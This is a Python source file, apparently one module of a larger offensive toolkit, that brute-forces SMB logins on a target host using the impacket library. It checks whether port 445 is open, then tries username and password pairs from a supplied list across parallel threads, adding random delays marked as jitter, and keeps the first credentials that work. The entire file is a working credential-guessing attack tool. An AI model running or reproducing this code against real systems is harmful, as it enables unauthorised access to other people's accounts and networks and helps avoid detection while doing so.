# Author: FAZ-28 
# Description: module for brute force smb
from impacket.smbconnection import SMBConnection
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import socket
import logging

class BruteForceSMB:
    def __init__(self, target_ip, target_port=445, combo_list=[], max_workers=10, max_errors=10):
        self.info = "SMB brute force module (using impacket)"
        self.targetIP = target_ip
        self.targetPORT = target_port
        self.combos = combo_list
        self.max_workers = max_workers
        self.max_errors = max_errors
        self.lock = threading.Lock()
        self.found = False
        self.valid_cred = None
        self.error_count = 0

    def is_smb_open(self):
        try:
            with socket.create_connection((self.targetIP, self.targetPORT), timeout=3):
                return True
        except:
            return False

    def attempt_login(self, username, password):
        if self.found or self.error_count >= self.max_errors:
            return None

        time.sleep(random.uniform(0.3, 1.2))  # jitter

        try:
            smb = SMBConnection(self.targetIP, self.targetIP, sess_port=self.targetPORT, timeout=5)
            smb.login(username, password)
            with self.lock:
                if not self.found:
                    self.found = True
                    self.valid_cred = (username, password)
                    logging.debug(f"Valid SMB credentials found: {username}:{password}")
            smb.close()
            return (username, password)

        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.debug(f"Failed SMB login {username}:{password} - {str(e)}")
            return None

    def run(self):
        if not self.is_smb_open():
            logging.warning("SMB port not open or target not reachable.")
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.attempt_login, u, p) for u, p in self.combos]

            for future in as_completed(futures):
                if self.found or self.error_count >= self.max_errors:
                    break

        return self.valid_cred if self.valid_cred else None
